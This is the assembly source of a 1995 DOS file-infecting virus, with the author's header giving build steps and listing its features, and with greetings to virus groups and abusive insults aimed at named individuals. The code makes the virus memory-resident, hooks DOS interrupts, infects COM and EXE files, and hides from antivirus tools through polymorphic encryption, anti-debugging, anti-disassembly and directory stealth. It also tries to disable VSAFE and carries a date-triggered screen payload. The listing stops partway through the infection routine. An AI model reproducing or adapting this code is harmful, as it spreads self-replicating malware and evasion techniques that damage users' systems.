comment ~
  First, I am sorry for my comment (my english is so very BAD!)

  This virus written in 1995 for fun purpose only. This virus not included
  all of the best virus technique, like multipartite, PE & NE infector,
  full stealth, interrupt tracing, or else--because I don't have enough time
  to finish it.

  If you crazy, you can including more the 'pretty' antidebugging
  routines in poly-encryptor macro, using stack modification or else.
  And full stealth routines for file access (open, read, debug).
  Or include this virus in Word macro viruses or Excel macro viruses.

  Be carefully for modification! You must have a master level
  of assembly language and familiar with TASM 2.0 or later.

  1. You must have a file, and the file name is ITA.COM. This file
     using for first installation.
  2. TASM PH1T400.ASM /M /DIS_POLY/DIS_FUN
  3. TLINK PH1T400.OBJ /X
  4. Run PH1T400.EXE, ITA.COM (size => 1024 byte) will be infected
  5. Run ITA.COM (oops, the virus go to resident)
  6. Run some files (oops, the file was infected)
  7. Booting your computer
  8. Repeat step 6 & 7 in others file for the best result (5 times)
  9. Bugs or Comments? Please welcome.


This virus included:
  - Slowly polymorphic with 4 model encryptor
  - Poly-encryptor in File and Memory
  - Anti-heuristic 
  - Anti-disassembly
  - Anti-debugging
  - Dir stealth (size)
  - For DOS v4.0 or later
  - Infected .COM, .EXE, .OVR, .OVL, ....
  - Not infected NE, PE, Internal overlay, ....
  - Comments in Indonesian

Greetings:
  - Polt
  - 29A
  - Medan Alphaz
  - Cicatrix
  - Falcon
  - furkon

Fuckings:
  - Foxz (you don't know who I am...and you're nothing...don't call yourself a virii makers)
  - Anton Pardede (goto the hell with your fuckin aid)
  - Andry ChristianZ (kiss dan fuck Foxz)
  - Vesselin Bontchev (fuck..fuck..fuck)

  Right now..I am so tired to writing a virus, but I will try to publish
  a virus source with new technique and new viruses sample
  from Indonesia to all of you in the future.

  @Phardera
~


file_size   = offset(auk-start)         ; ukuran virus di file
mem_size    = offset(eov-start)         ; alokasi memori
memory_size = (mem_size+file_size)      ; memory poly
virus_size  = offset(eof-start)         ; real size
enb = (virus_size+0Fh) and 0FFF0h       ; and --> kel 16

;* struktur data header
header_exe struc
      kodeexe   dw ?  ;00 --> 'MZ' or 'ZM'
      image1    dw ?  ;02
      image2    dw ?  ;04
      count     dw ?  ;06
      headsize  dw ?  ;08
      minmem    dw ?  ;0A
      maxmem    dw ?  ;0C 
      ss_rec    dw ?  ;0E --> <> CS
      sp_rec    dw ?  ;10 --> SP > 512
      chksum    dw ?  ;12 --> ID VIRUS              
      ip_rec    dw ?  ;14
      cs_rec    dw ?  ;16 --> <> SS
      new_exe   dw ?  ;18 --> NE +40
      overlay   dw ?  ;1A --> 0
header_exe ends

;* struktur data penampung
old_buf struc
      i21       dd ?
      i24       dd ?   
      org21     dd ?  ;#1 install to file
      file      dd ?
      minibuf   dd ?
old_buf ends

;* macro for anti-disassembly
;* portions (c) 1995 by Phardera
TRAP MACRO op1,op2,op3
ifdef is_fun
      jmp   $+3
endif
      ifb <op1>
ifdef is_fun
        db 39h
endif
      elseifb <op2>
ifdef is_fun
        db 03bh
endif
        op1    
      elseifb <op3>
ifdef is_fun
        db 9ah
endif
        op1   op2
      else
ifdef is_fun
        db 0eah
endif
        op1   op2,op3
      endif
ENDM

;-----------------------------------------
; PADE v1.5 - Phardera's Anti-debugging
; Portions (x) 1995 by Phardera 
; Written in Jakarta, Indonesia
; ---------------------------------------
; Assembled using TASM with option /DPADE  
; Using: PADE <op1>
;-----------------------------------------
PADE MACRO op1
ifdef is_funny
IFE op1 MOD 3
   TRAP
   push  ax ds si
   xor   ax,ax
   mov   si,ax
   mov   ds,si
   dec   ax
   cli
   TRAP  mov,[si+6],ax
   TRAP  mov,[si+0eh],ax
   mov   ax,0f00h
   TRAP  mov,[si+4],ax
   TRAP  mov,[si+0ch],ax
   sti
   TRAP
   pop   si ds ax
ELSE
   TRAP  
   push  ax bx dx
   TRAP  mov,dx,ss
   mov   ax,cs
   cli
   TRAP  mov,ss,ax
   TRAP  mov,bx,sp
   TRAP  neg,sp
   TRAP  mov,sp,3
   TRAP
   cmp   sp,3
   je    hang&op1
   cli
   TRAP  hlt
hang&op1:
   IFE op1 MOD 2
      xor   ax,ax
      TRAP  mov,ss,ax
      TRAP  neg,sp
      TRAP  mov,sp,0ch
      TRAP  mov,sp,4
      mov   ax,cs
      TRAP  cli
      TRAP  mov,ss,ax
   ENDIF
   TRAP
   mov   sp,offset stk&op1
   TRAP  add,sp,3
stk&op1:
   cli
   TRAP  mov,ss,dx
   TRAP  mov,sp,bx
   sti
   TRAP
   pop   dx bx ax
ENDIF
endif
ENDM


;* macro for poly-encryption 16-bit
;* portions (c) 1995 Phardera
;
; PDECODE xxx
;  cccccccc
; PENCODE xxx

PDECODE MACRO adr
ifdef is_fun
      TRAP  call, decode
      dw    @l&adr-l&adr      ; code size
      db    0                 ; addr & byte key encode (word)
l&adr:
endif
ENDM

PENCODE MACRO adr
ifdef is_fun
      TRAP  call, encode
      dw    @l&adr-l&adr+2    ; addr (byte)
@l&adr:
endif
ENDM


      smart
     .alpha
     .model small
      locals

      cade segment
      assume cs:cade,ds:_TEXT


;********************************
;* Instalasi Virus pertama kali *
;*  ke file                     *
;********************************
Phardera_5:
      ;* fucking shit!
      mov   ax,_text
      mov   ds,ax
      mov   ax,cade
      mov   ss,ax
      mov   sp,offset stackp

      ;* save int 21h
      ;* terpaksa double di memori! (i21   = jmp far asli)
      ;                             (org21 = call far asli)
      mov   2 ptr [old.i21],offset @@1
      mov   2 ptr [old.i21+2],cs

      mov   ax,3521h
      int   21h
      mov   2 ptr [old.org21],bx
      mov   2 ptr [old.org21+2],es

      ;* display gue
      mov   ax,cade
      mov   ds,ax
      lea   dx,[ddsr]
      mov   ah,9
      int   21h

      ;* call int 21h, ax=4B00h
      lea   dx,[nfile]
      mov   ax,4B00h
      pushf
      call  _text:geli21  

@@1:
      ;* done!
      mov   ax,4C00h
      int   21h

ddsr  db 13,10,'Instalasi virus ke file ITA.COM',13,10
      db '(c)1995 Phardera......',13,10,'$'

nfile db 'ITA.COM',0    ; phardera's
      db 10 dup (0)     ; cadangan file

      ;* stack
      db 2048-16 dup (?) ; be carefully!!
stackp:
ends


;* Badan Virus **************************************************************
     .code
     assume ds:_TEXT
     org 0

start:
;*************
;* Under DOS *
;*************
indos proc near                     ; for JMP, not CALL
      ;* reloc header asli
      PDECODE chkhdrcom
      call  @@point

@@point:
      pop   si
      sub   si,offset @@point
      push  es

      call  encode_header           ; buka encrypt header
      push  si                      ; si for dx bellow
      segcs
      lea   si,[oldhdr][si]
      push  cs
      pop   es
      mov   di,si
      mov   al,0E9h
      scasb                         ; COM?

      pop   dx                      ; dx = si
      pop   es                      

      PENCODE chkhdrcom
      TRAP  je, @@restcom

@@restexe:
      ;* EXE
      PDECODE hdrexe
      mov   bx,es                   ; es = seg psp
      add   bx,10h                  ; seg org = seg psp+10h (para)
      mov   cx,bx
      add   bx,cs:[si.ss_rec]       ; ss
      add   cx,cs:[si.cs_rec]       ; cs retf
      push  cx                      ; cs retf
      push  cs:[si.ip_rec]          ; ip retf
      push  cs:[si.sp_rec]          ; sp
      push  bx                      ; ss
      PENCODE hdrexe

      TRAP  jmp, @@dosver

@@restcom:
      ;* COM  -> CS=DS=ES -> STACK = PUSH DS ES
      PDECODE hdrcom
      mov   di,100h  
      push  cs di                   ; for retf CS:IP
      mov   cx,(size header_exe)/2  ; 28 byte/2
      rep   movsw                   ; because is word!
      PENCODE hdrcom

@@dosver:
      ;* versi dos > 4.0?
      PDECODE dosver
      push  ds es                   ; untuk pop es ds BEFORE retf
      mov   si,dx                   ; restore si
      call  encode_header           ; tutup encrypt header
      mov   ah,30h
      int   21h
      cmp   al,4         
      PENCODE dosver

      TRAP  jae, @@cekmemori
      jmp   @@do_oldhdr

@@cekmemori:
      ;* telah ada di memori?
      PDECODE chkmem  
      mov   ax,2C31h                ; yeah..it's not undocumented!
      int   21h
      cmp   ax,312Ch                ; real DOS = es:bx
      PENCODE chkmem

      TRAP  jne,@@do_tsr
      TRAP  jmp,@@do_oldhdr

@@do_tsr:
      PDECODE resident
      ;* fucking CPAV's VSAFE & MSAV's MSAFE
      mov    dx,not (0FA02h)       ; AX                                                 
      mov    ax,not (5945h)        ; DX
      xor    bl,bl
      xchg   ax,dx
      not    ax
      not    dx
      int    16h

comment ~
      ;* tanggal 31 Januari?
      mov   ah,2Ah
      int   21h
      cmp   dx,011Fh
      jne   @@allocate       ;***** jne
      push  ds cs
      pop   ds
      lea   dx,[phardera_d][si]
      mov   ah,9
      int   21h
      xor   ah,ah
      int   16h
      pop   ds
~

@@allocate:
      ;* residentkan virus ke memori
      ;* cari lokasi memori yang sesuai
      ;* memori berdasarkan paragrap (10h)

      mov   ah,48h  

ifdef is_poly
      mov   bx,(memory_size+0Fh)/10h
else
      mov   bx,(mem_size+0Fh)/10h
endif

      int   21h
      jnc   @@1                     ; dapat lokasi di memori

      mov   ax,ds
      dec   ax
      mov   ds,ax
      mov   bx,2 ptr ds:[3]

ifdef is_poly
      sub   bx,(memory_size+1Fh)/10h ; kurangi size memori
else
      sub   bx,(mem_size+1Fh)/10h    ; kurangi size memori
endif

      mov   ah,4Ah
      int   21h                                                     
      jmp   @@allocate                  

;------------------------------------------------------------------------
      phd  db "Phardera"
;------------------------------------------------------------------------

@@1:
      dec   ax
      mov   es,ax                   ; es = mcb
      mov   2 ptr es:[1],8          ; mcb owner = CONFIG.SYS

      ;* stamp label gue ke memori MCB
      push  si si
      lea   si,[phd][si]
      mov   di,8
      mov   cx,4
      cld
      rep   segcs movsw
      pop   si
      lea   si,[credits][si]
      lea   di,[nirwana]
      mov   cx,((endcredits-credits)/2)+1 ; div by 2
      inc   ax                      ; kembalikan es
      mov   es,ax                   ; ambil segment virus di memori
      rep   segcs movsw             ; is word

      ;* is_mine
      lea   di,[cayul]
      mov   al,1
      stosb

      mov   cx,virus_size           ; sebesar ukuran virus

      ;* simpan int 21h asli
      xor   ax,ax
      mov   ds,ax                   ; ds=0
      mov   si,21h*4
      lea   di,[old.org21]
      push  di si
      lea   di,[old.i21]
      movsw
      movsw
      pop   si di
      movsw
      movsw

      ;* set int 21h ke trap21
      push  es
      pop   ds                      ; ds = segment virus
      lea   dx,[trap21]
      mov   ax,2521h          

      pop   si                      ; cs:si=awal virus, es:di=0 in memory
      xor   di,di                   ; cs:si (awal) --> es:di (0)
      jmp   @@do_move

;------------------------------------------------------------------------
credits:
            db "-by Phardera'95-"
            db "----Batavia-----"
            db "---Indonesia----"
endcredits:    
;------------------------------------------------------------------------

@@do_move:
      PENCODE resident

      TRAP
      rep   segcs movsb             ; letakkan virus ke memori
      TRAP  int, 21h                ; DOS Services  ah=function 25h
                                    ;  set intrpt vector al to ds:dx

@@do_oldhdr:
      ;* force zero registers for command-line
      push  cs
      TRAP
      mov   di,not 100h
      TRAP
      mov   al,not 0E9h
      TRAP
      pop   es
      not   al
      TRAP  not, di
      scasb                         ; COM?
      TRAP
      pop   es ds
      TRAP  je, @@is_com

      ;* stack EXE
      pop   bx cx                   ; bx,cx = ss:sp
      TRAP
      pop   ax dx                   ; cs:ip
      cli
      TRAP  mov,ss,bx
      TRAP  mov,sp,cx
      sti
      TRAP
      push  dx ax                   ; cs:ip

@@is_com:
      TRAP  xor,ax,ax
      TRAP  xor,bx,bx
      xor   cx,cx
      TRAP  xor,dx,dx
      xor   si,si
      TRAP  xor,di,di
      TRAP  retf                     ; run exe
indos endp
;----------------------------------------------------


;***************************************************
;* Pencegat int 24h di memori saat infeksi ke file *
;***************************************************
trap24 proc near                    ; not CALL
      TRAP  xor,al,al               ; mencegah pesan error dos
      TRAP  iret
trap24 endp


;*************************************
;* Pencegat int 21h di memori        *
;* Prosedur yang dipanggil           *
;*  tanpa lewat old Int 21h [NOT AX] *
;*************************************
trap21 proc far ;near               ; not CALL
      TRAP  sti

      ;* is me!
      TRAP  cmp,ax,2C31h            ; not undocumented!
      TRAP  xchg,al,ah
      TRAP  jne, @@find_first_fcb
      TRAP  iret

@@find_first_fcb:
      TRAP  not, ax                 ; fucking heuristics
                                    ; reverse -> ja, jb
      ;* dir stealth
      TRAP
      cmp   al,not 11h              ; find first fcb
      TRAP  ja, @@find_first_hdl

@@find_next_fcb:
      ;* dir stealth
      TRAP
      cmp   al,not 12h
      TRAP  jb, @@find_first_hdl
      PDECODE pfnfcb
      call  find_fcb
      PENCODE pfnfcb
      TRAP  retf, 2
  
@@find_first_hdl:
      ;* dir stealth
      TRAP
      cmp   al,not 4Eh
      TRAP  ja, @@open6C

@@find_next_hdl:
      ;* dir stealth
      TRAP
      cmp   al,not 4Fh
      TRAP  jb, @@open6C
      PDECODE pfnhdl
      call  find_hdl
      PENCODE pfnhdl
      TRAP  retf, 2

      ; 4202 ;seek end
      ; 3F   ;read file
      ; dcb

@@open6C:
;      TRAP  push,ax
;      TRAP  pushf
;      TRAP  pop,ax
;      TRAP  test,ah,1
;      TRAP  pop,ax
;      TRAP  jnz,@@do_org

;      TRAP
;      cmp   ax,not 006Ch
;      TRAP  jne,@@open3D
;      TRAP  test,bl,3
;      TRAP  jnz,@@do_org
;      TRAP  mov,dx,di
;      TRAP  jmp,@@yeah

@@open3D:
;      TRAP
;      cmp   al,not 3Dh
;      TRAP  je,@@yeah


@@load_execute:
ifdef is_fun
      TRAP  call, anti_trace        ;! fuck MAV
endif

      ;* execute
      TRAP
      cmp   al,not 4Bh              ; run
      TRAP  jne,@@do_org
@@yeah:
      TRAP  call,execute_program

@@do_org:
      TRAP  not, ax                 ; awasssss!
      TRAP  xchg,al,ah
      TRAP  jmp, old_21
trap21 endp


;*******************
;* Int 21h, AH=4Bh *
;*******************
execute_program proc near
      PDECODE sakit1
      ;* load/execute program (4Bh)
      pushf
fake  = $-1
      push  ax bx cx dx si di ds es

ifdef is_nothing
      mov   1 ptr ds:[fake], 0C3h
endif

      call  init                    ; get @file name, save int 24h
      call  is_file_infected?       ; [bufhdr] terinfeksi?
      PENCODE sakit1

      TRAP
      jc    @@restore24             ; carry = jangan infeksi
      TRAP  call,infection_file     ; serang! don't encrypt

@@restore24:
      ;* kembalikan int 24h asli dari stack
      PDECODE sakit2
      pop   ax dx ds
      call  Int21

      pop   es ds di si dx cx bx ax
      popf
      PENCODE sakit2

      TRAP  ret
execute_program endp


;********************
;* Simpan @FileName *
;* Simpan Int 24h   *
;********************
init  proc near
      PDECODE initialize
      pop   cx                      ;! ret
      cld
      push  cs
      pop   es

      ;* ambil alamat nama file untuk dibaca
      lea   di,[old.file]
      xchg  ax,dx
      stosw
      mov   ax,ds
      stosw

      ;* simpan int 24h ke stack (!!)
      mov   ax,3524h  
      call  Int21
      push  es bx

      ;* set int 24h ke virus
      push  cs
      pop   ds
      lea   dx,[trap24]
      mov   ah,25h    
      push  ax                      ; stack
      call  Int21                   ; DOS Services  ah=function 25h
                                    ;  set intrpt vector al to ds:dx

      push  cx                      ;! ret
      PENCODE initialize
      TRAP  ret
init  endp


;********************************
;* File sesuai untuk diinfeksi? *
;********************************
is_file_infected? proc near
      ;* file terinfeksi?
      PDECODE chkfile

      ;* buka file untuk dibaca
      lds   dx,cs:[old.file]
      mov   ah,3Dh  
      xor   al,al
      call  Int21                   ; DOS Services  ah=function 3Dh
                                    ;  open file, al=mode,name@ds:dx
      push  cs cs
      pop   ds es

      jnc   @@read_header           ; Jump if carry<>0
      jmp   @@jangan_serang

@@read_header:
      ;* baca header file sebanyak 28 byte
      xchg  ax,bx                   ; bx = ax = handle

      ;* mulai baca header
      lea   dx,[bufhdr]             ; isi bufhdr
      mov   cx,size header_exe      ; 28 byte
      mov   ah,3Fh                    
      call  Int21                   ; DOS Services  ah=function 3Fh
                                    ;  read file, bx=file handle
                                    ;   cx=bytes to ds:dx buffer
      ;* cek ID
      xchg  dx,di                   ; di=dx
      mov   ax,[di.chksum]
      xor   al,ah
      inc   al                      ; fucking heuristics
      cmp   al,0ADh+1

      jne   @@is_com?
      jmp   @@jangan_serang

@@is_com?:
      ;* cek COM
      push  di
      mov   al,0E9h                 ; JMP
      scasb
      pop   di
      je    @@cek_size     

      ;* cek EXE 1
      push  di
      mov   ax,5A4Dh                ; MZ
      scasw
      pop   di
      je    @@is_match_maxmem?

      ;* cek EXE 2
      push  di
      mov   ax,4D5Ah                ; ZM
      scasw
      pop   di
      je    @@is_match_maxmem?
      jmp   @@jangan_serang


@@is_match_maxmem?:
      ;* maxmem virus <> FFFFh      ; maxmem file
      add   di,0Ch
      mov   ax,0FFFFh               ; (file_size+0Fh)/10h 
      scasw
      jne   @@1                     ; ja  @@jangan_serang     

      ;* sp < 512?
      scasw
;     mov   ax,100
;     push  di
;     scasw
;     pop   di
;     ja    @@1                     ; @@jangan_serang

      ;* sp ganjil? (odd sp?)
      mov   ax,[di]
      test  al,00000001b
      jnz   @@1                     ; @@jangan_serang 
      scasw                         ; add di,2

      ;* chksum <> 0 ?
      xor   ax,ax
      scasw
      jne   @@1

      ;* cs=ss ?
      scasw                         ; add di,2
      mov   ax,[di-8]
      scasw
      je    @@1                     ; @@jangan_serang

      ;* overlay?
      push  di
      scasw
      xor   ax,ax
      scasw
      pop   di
      jne   @@1                     ; @@jangan_serang

      ;* windows or os/2
      mov   ax,+40h
      scasw
      jbe   @@1

@@cek_size:
      ;* ID COM or EXE
      push  ax                      ; cx

      ;* size file
      xor   cx,cx                   ; Zero register
      mov   ax,4202h
      cwd
      call  Int21                   ; DOS Services  ah=function 42h
                                    ;  move file ptr, bx=file handle
                                    ;   al=method, cx,dx=offset
      ;* COM or EXE?
      pop   cx                      ; ax
      cmp   cl,0E9h  
      jne   @@size_exe

      ;* size .COM
      or    dx,dx
      jnz   @@1
      cmp   ax,333h
      jb    @@1

ifdef is_poly
      cmp   ax,(0FFFFh-virus_size-100h-file_size)
      ;!         COM   STCK POLY   PSP   SIZE
else
      cmp   ax,(0FFFFh-800h-100h-file_size)
      ;!         COM   STCK  PSP  SIZE
endif

      jbe   @@belum_ada
@@1:
      jmp   @@jangan_serang

@@size_exe:
      ;* size .EXE
      or    dx,dx
      jnz   @@2
      cmp   ax,666h
      jb    @@1
@@2:
      cmp   dx,6
      ja    @@jangan_serang
      jb    @@is_internal_overlay?

      ;* lebih dari 420000 byte
      cmp   ax,68A0h
      ja    @@jangan_serang 

@@is_internal_overlay?:
      push  ax dx                   ; simpan size

      ;* internal overlay (EXE)
      mov   cx,200h                 ; 512 byte
      mov   ax,[bufhdr.image2]      ; image2
      dec   ax
      mul   cx                      ; dx:ax = reg * ax
      pop   cx     ;dx
      cmp   cx,dx
      pop   dx     ;ax
      ja    @@jangan_serang 
      push  dx cx  ;ax dx
      sub   dx,ax
      pop   dx ax                   
      jnc   @@belum_ada             ; Jump if carry=0

@@jangan_serang:
      mov   ah,3Eh
      call  Int21
      stc                           ; jangan serang
      jmp   @@checkexit
            
@@belum_ada:
      mov   ah,3Eh
      call  Int21
      clc                           ; ya, infeksikan

@@checkexit:
      pushf
      call  is_mine
      popf
      PENCODE chkfile
      TRAP  ret
      ;!! int 24h not yet restore
is_file_infected? endp

is_mine:
PDECODE ananta
      ;* tanggal 10?
      mov   ah,2Ah
      call  Int21
      cmp   dl,0Ah
      je    doit           ;***** jne
diot:
      jmp   looser

doit:
      cmp   [cayul],1
      jne    diot
      mov   [cayul],0
      mov   ax,0619h
      mov   bh,0dh
      xor   cx,cx
      mov   dx,184Fh
      int   10h                     ; Video display   ah=functn 06h
                                    ;  scroll up, al=lines
                                    ;   bh=attrib, cx+dx=window size
     mov    ah,0Fh
     int    10h                     ; Video display   ah=functn 0Fh
                                    ;  get state, al=mode, bh=page
                                    ;   ah=columns on screen

      mov     byte ptr [page_number],bh
      mov     ah,3
      mov     bh,byte ptr [page_number]
      int     10h                     ; Video display   ah=functn 03h
                                                ;  get cursor loc in dx, mode cx
                mov     word ptr [cursor_type],cx
                mov     ah,1
                mov     bh,byte ptr [page_number]
                mov     ch,20h                  ; ' '
                int     10h                     ; Video display   ah=functn 01h
                                                ;  set cursor mode in cx


                mov     ax,3508h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     word ptr [old_ofs_8],bx
                mov     ax,es
                mov     word ptr [old_seg_8],ax
                mov     ax,2508h
                mov     dx,offset int_8_entry       
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx

                mov     word ptr [counter],0
                mov     byte ptr [l_cursor],26h  ; '&'
                mov     byte ptr [r_cursor],29h  ; ')'
                mov     dh,0
                mov     si,1
loc_3:
                mov     al,3
                mov     dl,byte ptr [l_cursor]
                call    set_and_write
                mov     dl,byte ptr [r_cursor]
                call    set_and_write
                mov     al,20h                  ; ' '
                mov     dl,byte ptr [l_cursor]
                add     dl,2
                call    set_and_write
                mov     dl,byte ptr [r_cursor]
                sub     dl,2
                call    set_and_write
                call    delay
                add     byte ptr [r_cursor],2
                sub     byte ptr [l_cursor],2
                jns     loc_3                   ; Jump if not sign


                mov     dl,0
                mov     dh,1
loc_4:
                mov     al,20h                  ; ' '
                dec     dh
                call    set_and_write
                mov     dl,4Fh                  ; 'O'
                call    set_and_write
                mov     al,3
                inc     dh
                call    set_and_write
                mov     dl,0
                call    set_and_write
                call    delay
                inc     dh
                cmp     dh,18h
                jbe     loc_4                   ; Jump if below or =


                mov     byte ptr [l_cursor],0
                mov     byte ptr [r_cursor],4Fh  ; 'O'
                mov     dh,18h
loc_5:
                mov     al,20h                  ; ' '
                mov     dl,byte ptr [l_cursor]
                call    set_and_write
                mov     dl,byte ptr [r_cursor]
                call    set_and_write
                mov     al,3
                add     byte ptr [l_cursor],2
                mov     dl,byte ptr [l_cursor]
                call    set_and_write
                sub     byte ptr [r_cursor],2
                mov     dl,byte ptr [r_cursor]
                call    set_and_write
                call    delay
                cmp     byte ptr [l_cursor],26h  ; '&'
                jb      loc_5                   ; Jump if below


                mov     dl,26h                  ; '&'
                mov     dh,17h
loc_6:
                mov     al,20h                  ; ' '
                inc     dh
                call    set_and_write
                mov     dl,29h                  ; ')'
                call    set_and_write
                mov     al,3
                dec     dh
                call    set_and_write
                mov     dl,26h                  ; '&'
                call    set_and_write
                call    delay
                dec     dh
                cmp     dh,0Ch
                jae     loc_6                   ; Jump if above or =

                mov     al,20h                  ; ' '
                mov     dh,0Ch
                mov     dl,27h                  ; '''
                call    set_and_write
                mov     al,2Bh                  ; '+'
                mov     dl,28h                  ; '('
                call    set_and_write
                mov     byte ptr [l_cursor],26h  ; '&'
                mov     word ptr [sptr],0
                mov     byte ptr [r_cursor],29h  ; ')'

loc_7:
                mov     di,offset Tinot
                add     di,word ptr [sptr]
                mov     al,[di]
                mov     dl,byte ptr [l_cursor]
                call    set_and_write
                mov     al,3
                dec     dl
                call    set_and_write
                mov     di,offset Tita
                add     di,word ptr [sptr]
                mov     al,[di]
                mov     dl,byte ptr [r_cursor]
                call    set_and_write
                mov     al,3
                inc     dl
                call    set_and_write
                call    delay
                dec     byte ptr [l_cursor]
                inc     byte ptr [r_cursor]
                inc     word ptr [sptr]
                cmp     word ptr [sptr],yup
                jb      loc_7                   ; Jump if below


                mov     al,20h                  ; ' '
                mov     dl,(l_yup+1)            ; ' '
                call    set_and_write
                mov     dl,r_yup                ; '/'
                call    set_and_write
                mov     al,3
                mov     dl,l_yup ;1Fh
                call    set_and_write
                mov     dl,r_yup ;30h                  ; '0'
                call    set_and_write
                call    delay
                mov     byte ptr [l_cursor],l_yup ;1Fh
                mov     byte ptr [r_cursor],r_yup ;30h  ; '0'
loc_8:
                mov     dh,0Bh
                mov     dl,byte ptr [l_cursor]
                call    set_and_write
                mov     dh,0Dh
                mov     dl,byte ptr [r_cursor]
                call    set_and_write
                call    delay
                inc     byte ptr [l_cursor]
                dec     byte ptr [r_cursor]
                cmp     byte ptr [l_cursor],r_yup ;30h  ; '0'
                jbe     loc_8                   ; Jump if below or =


                mov     word ptr [counter],0
                mov     si,5Ah
                call    delay


                push    ds
                mov     ax,2508h
                mov     dx,word ptr [old_ofs_8]
                mov     bx,word ptr [old_seg_8]
                mov     ds,bx
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                pop     ds


                mov     ah,1
                mov     bh,byte ptr [page_number]
                mov     cx,word ptr [cursor_type]
                int     10h                     ; Video display   ah=functn 01h
                                                ;  set cursor mode in cx
                jmp     looser

Tinot db 'aredrahP '
Tita  db ' Dianita '
yup = $-Tita
r_yup = 29h + yup
l_yup = 26h - yup 

cursor_type dw ?
page_number db ?
l_cursor db ?
r_cursor db ?
sptr dw ?

counter dw ?
old_ofs_8 dw ?
old_seg_8 dw ?

set_and_write   proc    near
                push    ax
                push    bx
                push    cx
                push    dx
                push    ax
                mov     ah,2
                mov     bh,byte ptr [page_number]
                int     10h                     ; Video display   ah=functn 02h
                                                ;  set cursor location in dx
                pop     ax
                mov     ah,0Ah
                mov     bh,byte ptr [page_number]
                mov     cx,1
                int     10h                     ; Video display   ah=functn 0Ah
                                                ;  set char al at present curs
                                                ;   cx=# of chars to replicate
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                retn
set_and_write           endp

delay           proc    near
                push    si
                add     si,word ptr [counter]
loc_10:
                cmp     si,word ptr [counter]
                jae     loc_10                  ; Jump if above or =
                pop     si
                retn
delay           endp


int_8_entry:
  inc word ptr [counter]
  jmp dword ptr [old_ofs_8]

looser:
PENCODE ananta
      TRAP  ret

;****************************
;* Infeksikan Virus ke File *
;****************************
infection_file proc near
      PDECODE attrib
      ;* get atrribut file (cs:) ke stack
      lds   dx,cs:[old.file]
      push  dx
      mov   ax,4300h
      call  Int21
      push  cx

      ;* set atrribut normal
      xor   cx,cx
      mov   ax,4301h
      push  ax
      call  Int21
      PENCODE attrib
      TRAP  jc, @@do_restattr           ; gagal set attribut normal

      ;* open file for read/write
      PDECODE openf
      mov   ax,3D02h
      call  Int21
      PENCODE openf

      TRAP  jnc, @@get_ftime

@@do_restattr:
      jmp   @@restore_fattr

@@get_ftime:
      PDECODE datetime
      push  cs cs
      pop   ds es                   ; cs = ds = es

      xchg  ax,bx                   ; bx = handle

      ;* simpan waktu dan tanggal file
      mov   ax,5700h
      call  Int21      
      push  dx cx

      ;* simpan header file asli
      lea   si,[bufhdr]             ; [bufhdr] dari rutin is_file_inf..
      push  si                      ; di = si (down)
      lea   di,[oldhdr]
      mov   cx,(size header_exe)/2  ; 28 byte /2  (word)
      cld
      rep   movsw

      ;* enkrip header
      ;xor   si,si
      mov   si,0CAFEh
      call  encode_header

      ;* pindahkan pointer ke akhir file untuk data jmp
      xor   cx,cx
      mov   ax,4202h
      cwd
      call  Int21                   ; dx:ax = size

      ;* relokasi jmp COM                     
      pop   di                      ; di = si
      push  ax

ifdef is_poly
      add   ax,100h
      mov   2 ptr [old.minibuf],ax
endif

      mov   al,0E9h                 ; com or exe
      scasb
      pop   ax
      jne   @@calc_hdrexe
      sub   ax,3
      stosw                         ; ip

      ;* dummy garbage for header COM
      lea   si,[old]
      mov   cx,(12h-3)              ; chksum-jmp
      rep   movsb

      ;* id (chksum)
      mov   ah,0ADh
      in    al,40h
      xor   ah,al
      stosw                         ; id  com

ifdef is_poly
      mov   al,1
endif

      jmp   @@do_wrtvrs

@@calc_hdrexe:
      ;* kalkulasi header exe
      dec   di                      ; di = si
      push  dx ax                   ; simpan size
      add   ax,file_size            ; size virus infect
      adc   dl,0                    ; kelebihan? +CF
      mov   cx,200h                 ; cx = 512
      div   cx                      ; dx:ax/512 = dx:ax  sisa:hasil
      or    dx,dx                   ; bersisa?
      jz    @@reloc_hdrexe
      inc   ax                      ; ya, tambah 1

@@reloc_hdrexe:
      ;*  relokasi header exe
      xchg  ax,dx
      scasw            ; kodeexe
      stosw            ; image1
      xchg  ax,dx
      stosw            ; image2
      scasw            ; count
      scasw            ; headsize
      mov   ax,((file_size*2)+0Fh)/10h
      stosw            ; minmem
      scasw            ; maxmem
      pop   ax dx                   ; ambil size file
      mov   cx,10h
      div   cx
      sub   ax,[di-6]  ; head size
      mov   [di+6],dx  ; ip_rec

ifdef is_poly
      mov   2 ptr [old.minibuf],dx
endif

      mov   [di+8],ax  ; cs_rec
      inc   ax
      stosw            ; ss_rec
      xchg  ax,dx

ifdef is_poly
      add   ax,(memory_size+512)
      and   ax,0FFFEh  ; genapkan
else
      and   al,11111110b            ; 0FEh
      mov   ah,(high enb)+4         ; paragraph  (4*10h=400 byte)
endif

      stosw            ; sp_rec

      in    ax,40h
      stosw            ; chksum (id exe) 

ifdef is_poly
      xor   al,al
endif

@@do_wrtvrs:
ifdef is_poly
      PENCODE datetime
      TRAP  call, setup_poly        ; --> CX

      mov   ah,not 40h
      TRAP  mov,cx,file_size
      mov   dx,offset eov
      TRAP  not, ah                 ; fucking heuristics
else
       ;* tulis virus ke file
      mov   cx,file_size
      mov   ah,40h  
      cwd                           ; ds:0000h  (in memory)
      PENCODE datetime
endif

      TRAP  call, Int21             ; DOS Services  ah=function 40h
                                    ;  write file  bx=file handle
                                    ;  cx=bytes from ds:dx buffer
      jnc   @@do_wrthdr             ; if success
      TRAP  cmp,ax,cx
      jb    @@restore_ftime         ; disk full!

@@do_wrthdr:
      PDECODE wrthdr
      ;* pindahkan pointer ke awal file untuk penulisan header virus
      xor   cx,cx                                    
      mov   ax,4200h
      cwd
      call  Int21                   ; DOS Services  ah=function 42h
                                    ;  move file ptr, bx=file handle
                                    ;   al=method, cx,dx=offset

      ;* tulis header manipulasi ke file terinfeksi
      mov   ah,40h                  
      mov   cx,size header_exe      ; 28 byte
      lea   dx,[bufhdr]             ; buffer header 
      call  Int21                   ; DOS Services  ah=function 40h
                                    ;  write file  bx=file handle
                                    ;   cx=bytes from ds:dx buffer

      ;* for stealth dir
      pop   cx
      or    cx,00011111b            ; set time (second)
      push  cx
      PENCODE wrthdr

@@restore_ftime:
